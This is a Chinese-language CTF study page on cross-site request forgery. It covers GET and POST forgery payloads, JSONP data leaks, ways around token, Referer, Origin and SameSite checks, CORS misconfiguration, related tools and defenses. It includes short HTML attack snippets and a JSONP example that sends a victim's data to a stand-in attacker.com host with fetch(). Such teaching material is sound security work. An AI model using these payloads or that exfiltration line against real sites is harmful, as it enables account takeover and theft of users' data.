# CSRF (跨站请求伪造)

## 概述

跨站请求伪造（Cross-Site Request Forgery，CSRF）是一种利用用户已登录状态，在用户不知情的情况下以用户身份发起非预期操作的攻击。CTF 中 CSRF 题目通常需要构造恶意页面或 Payload，诱使受害者（常为管理员 Bot）执行修改密码、转账、发送消息等操作。

## 常见攻击手法

### 1. 基本利用

- **原理**：用户已登录网站 A（有 Cookie），攻击者诱使用户访问恶意页面 B，页面 B 自动向网站 A 发送跨站请求（如图片、表单自动提交）

- **利用方式**：
  - **GET 请求 CSRF**：通过 `<img>`、`<script>`、`<link>` 等标签发起 GET 请求
    ```html
    <img src="http://target.com/change_password?new_pass=123456">
    ```
  - **POST 请求 CSRF**：通过自动提交表单发起 POST 请求
    ```html
    <form id="csrf" action="http://target.com/change_password" method="POST">
      <input name="new_pass" value="123456">
    </form>
    <script>document.getElementById('csrf').submit();</script>
    ```

- **利用 XSS 触发 CSRF**：如果目标存在 XSS，可以在 XSS payload 中发送 CSRF 请求

- **复杂参数处理**：对于 JSON 格式的 CSRF 请求：
  - 修改 `Content-Type` 为 `text/plain` 或 `application/x-www-form-urlencoded`（利用后端宽松解析）
  - 使用 `Fetch API` 配合 CORS（如果目标 CORS 配置不当）

### 2. JSONP 接口利用

JSONP（JSON with Padding）是一种跨域数据获取方式，常被用于 CSRF 或绕过 CSP。

- **原理**：JSONP 通过 `<script>` 标签加载跨域数据，服务器返回 callback 函数调用
  ```http
  GET /api/user?callback=myFunc HTTP/1.1
  Host: target.com
  ```
  ```javascript
  myFunc({"username":"admin","token":"abc123"})
  ```

- **利用方式**：
  - **信息窃取**：通过 JSONP 获取用户的敏感信息（如 Token、CSRF Token）
  - **CSP 绕过**：如果 CSP 允许特定域名的 script 加载，JSONP 接口可作为绕过点
  - **构造 JSONP Callback**：
    ```html
    <script>
    function leak(data) {
      fetch('http://attacker.com/?d=' + JSON.stringify(data));
    }
    </script>
    <script src="http://target.com/api/user?callback=leak"></script>
    ```

### 3. CSRF Token 绕过

- **Token 未绑定 Session**：Token 与用户 Session 未关联，可复用
- **Token 在 Cookie 中**：Token 也在 Cookie 中时，攻击者无法获取但可利用某些场景
- **Referer 校验绕过**：
  - `Referer` 为空的情况：使用 `iframe`、`meta` 刷新等方式发起请求
  - `Referer` 前缀匹配绕过：`http://target.com.attacker.com/`
- **Origin 校验绕过**：
  - Origin 为 `null`：使用 `data:`、`file:` 等协议发起请求
  - `sandbox` 属性的 iframe 中 Origin 可为 `null`

### 4. SameSite Cookie 绕过

Chrome 80+ 默认将未设置 SameSite 的 Cookie 视为 `SameSite=Lax`。

- **Lax 模式限制**：仅允许 GET 请求的顶级导航携带 Cookie，POST 请求不携带
- **绕过方法**：
  - **GET 请求的 CSRF**：如果关键操作支持 GET 方式
  - **子域名攻击**：如果 Cookie 的 `Domain` 设置较宽泛，子站点可发起 CSRF
  - **SameSite=None**：若网站将 Cookie 设置为 `SameSite=None; Secure`，则不限制跨站发送

### 5. 绕过 CORS 配置

CORS 配置不当可辅助 CSRF 攻击。

- **Origin 反射**：`Access-Control-Allow-Origin: *` 或有漏洞的 Origin 反射
- **凭证允许**：`Access-Control-Allow-Credentials: true` 允许携带 Cookie
- **预检请求绕过**：简单请求（GET/POST 且 Content-Type 为表单类型）不发预检请求

### 6. 高级利用

- **CSRF + XSS 组合**：利用 XSS 绕过 CSRF Token 保护
- **登录 CSRF**：强制用户使用攻击者控制的账号登录，后续操作可追踪
- **CSRF Token 泄露**：通过 Referer 头泄露 Token
- **双重 Cookie 提交缺陷**：Token 以 Cookie 形式发送，同时作为请求参数提交

### 7. CSRF 自动化检测

- **寻找状态改变操作**：修改密码、更改邮箱、转账、发帖、删除内容等
- **分析请求**：确定操作是否依赖于可预测的参数
- **构建 PoC**：创建包含自动提交表单或 XHR 请求的 HTML 页面

## 相关工具

| 工具 | 用途 |
|------|------|
| Burp Suite CSRF PoC Generator | 自动生成 CSRF PoC 页面 |
| XSS Hunter | CSRF + XSS 组合利用 |
| BeEF | 浏览器利用框架，含 CSRF 模块 |

## 防御建议

- 使用 CSRF Token（每个用户独立的、不可预测的 Token）
- 设置 SameSite Cookie 属性（Strict 或 Lax）
- 验证 Referer 或 Origin 头（推荐 Origin，更可靠）
- 对敏感操作增加二次认证（密码、验证码）

## CTF 中的常见考点

- 构造自动提交表单利用管理员 Bot 修改密码
- JSONP 接口窃取 Token 后用于 CSRF 请求
- 配合 XSS 绕过 CSRF 防护
- 利用 Referer 校验不严的缺陷

## 相关技能

- [XSS](XSS.md)
- [认证绕过](认证绕过.md)
- [逻辑漏洞](Web逻辑漏洞.md)
- [WEB流量分析](../安全杂项/WEB流量分析.md)
